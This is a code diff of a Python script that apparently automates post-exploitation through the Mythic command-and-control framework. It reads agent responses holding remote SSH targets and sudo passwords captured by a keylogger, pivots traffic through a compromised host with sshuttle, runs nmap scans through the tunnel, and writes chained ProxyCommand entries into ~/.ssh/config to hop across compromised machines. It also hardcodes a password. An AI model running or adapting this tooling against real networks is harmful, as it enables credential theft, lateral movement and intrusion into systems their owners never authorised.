@@ -27,78 +27,101 @@ async def scripting():
 async def handle_resp(token, message):
 
     # just print out the entire message so you can see what you get
-    await mythic_rest.json_print(message)
+    # await mythic_rest.json_print(message)
     # just print the name of the command that resulted in this response
-    print(message.task.command.cmd)
+    # print(message.task.command.cmd)
     # just print the actual response data that came back
-    print(message.response)
+    # print(message.response)
 
-    if "keylog" in message.response:
-        print("WE DONT HAVE THE PASSWORD")
+    if message.task.command.cmd == "nmap":
+        print("è DAVVERO NMAP")
 
-    else:
+        if "keylog" in message.response:
+            print("WE DONT HAVE THE PASSWORD")
+
+        else:
+            params = message.response.split(";")
+            address = params[0]
+            psw = params[1]
+            args = params[2]
+
+            print("SSH: " + address)
+            print("Local Sudo Password: " + local_psw)
+            print("Remote Sudo Password: " + psw)
+            print("Nmap " + args)
+
+            psw = "bubiman10"
+
+            child = pexpect.spawnu("bash")
+            child.logfile = open("./log.log", "w")
+            child.expect(".*@")
+            child.sendline("sshuttle -r " + address + " 0/0")
+            child.expect(".*assword")
+            child.sendline(local_psw)
+            # child.expect(".*assword")
+            # child.sendline(psw)
+            child.expect(".*onnected")
+
+            p = pexpect.spawnu("bash")
+            p.logfile_read = open("./log2.log", "w")
+            p.sendline("curl ipv4.icanhazip.com")
+            time.sleep(1)
+            p.expect(".*\.")
+
+            address_file = open("./log2.log", "r")
+            text = str(address_file.readlines())
+            pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
+            ip = pattern.findall(text)[0]
+
+            os.remove("./log.log")
+            os.remove("./log2.log")
+
+
+            thread = threading.Thread(target=nmap, args=(args, address.split("@")[1]), daemon=True)
+            thread.start()
+            # await nmap(args, address.split("@")[1])
+
+            # print("[+] Starting Nmap scan")
+            # nmap = pexpect.spawnu("bash")
+            # nmap.logfile = open("./nmap_" + address.split("@")[1] + ".log", "w")
+            # nmap.sendline("nmap " + args)
+            # nmap.expect("scanned")
+            # print("[+] Nmap Done")
+
+            # from subprocess import Popen, PIPE
+
+            # cmd = "nmap " + args + ""
+            # print(cmd)
+
+            # p = Popen(cmd.split(), stdin=PIPE, stdout=PIPE, stderr=PIPE)
+            # output = p.communicate()
+                    
+            # f = open("./nmap_" + address.split("@")[1] + ".log", "w")
+            # f.write(str(output))
+            # f.flush()
+            # f.close()
+
+            # print("[+] Scan finished: check ./nmap_" + address.split("@")[1] + ".log for the result")
+
+
+    if message.task.command.cmd == "trace":
+
+        print("[+] Creating config file")
+        config = open(os.path.expanduser("~") + "/.ssh/config", "w")
+
         params = message.response.split(";")
-        address = params[0]
-        psw = params[1]
-        args = params[2]
 
-        print("SSH: " + address)
-        print("Local Sudo Password: " + local_psw)
-        print("Remote Sudo Password: " + psw)
-        print("Nmap " + args)
-
-        psw = "bubiman10"
-
-        child = pexpect.spawnu("bash")
-        child.logfile = open("./log.log", "w")
-        child.expect(".*@")
-        child.sendline("sshuttle -r " + address + " 0/0")
-        child.expect(".*assword")
-        child.sendline(local_psw)
-        # child.expect(".*assword")
-        # child.sendline(psw)
-        child.expect(".*onnected")
-
-        p = pexpect.spawnu("bash")
-        p.logfile_read = open("./log2.log", "w")
-        p.sendline("curl ipv4.icanhazip.com")
-        time.sleep(1)
-        p.expect(".*\.")
-
-        address_file = open("./log2.log", "r")
-        text = str(address_file.readlines())
-        pattern = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
-        ip = pattern.findall(text)[0]
-
-        os.remove("./log.log")
-        os.remove("./log2.log")
-
-
-        thread = threading.Thread(target=nmap, args=(args, address.split("@")[1]), daemon=True)
-        thread.start()
-        # await nmap(args, address.split("@")[1])
-
-        # print("[+] Starting Nmap scan")
-        # nmap = pexpect.spawnu("bash")
-        # nmap.logfile = open("./nmap_" + address.split("@")[1] + ".log", "w")
-        # nmap.sendline("nmap " + args)
-        # nmap.expect("scanned")
-        # print("[+] Nmap Done")
-
-        # from subprocess import Popen, PIPE
-
-        # cmd = "nmap " + args + ""
-        # print(cmd)
-
-        # p = Popen(cmd.split(), stdin=PIPE, stdout=PIPE, stderr=PIPE)
-        # output = p.communicate()
-                
-        # f = open("./nmap_" + address.split("@")[1] + ".log", "w")
-        # f.write(str(output))
-        # f.flush()
-        # f.close()
-
-        # print("[+] Scan finished: check ./nmap_" + address.split("@")[1] + ".log for the result")
+        list = message.response.split(" --> ")
+        char = "A"
+        for node in list:
+            hostname = node.split(";")[0].split("@")[1]
+            user = node.split(";")[0].split("@")[0]
+            config.write("Host " + char + "\n")
+            config.write("\tHostname " + hostname + "\n")
+            config.write("\tUser " + user + "\n")
+            if char != "A":
+                config.write("\tProxyCommand ssh -W %h:%p " + chr(ord(char) - 1) + "\n")
+            char = chr(ord(char) +1)
 
 
 def nmap(args, address):
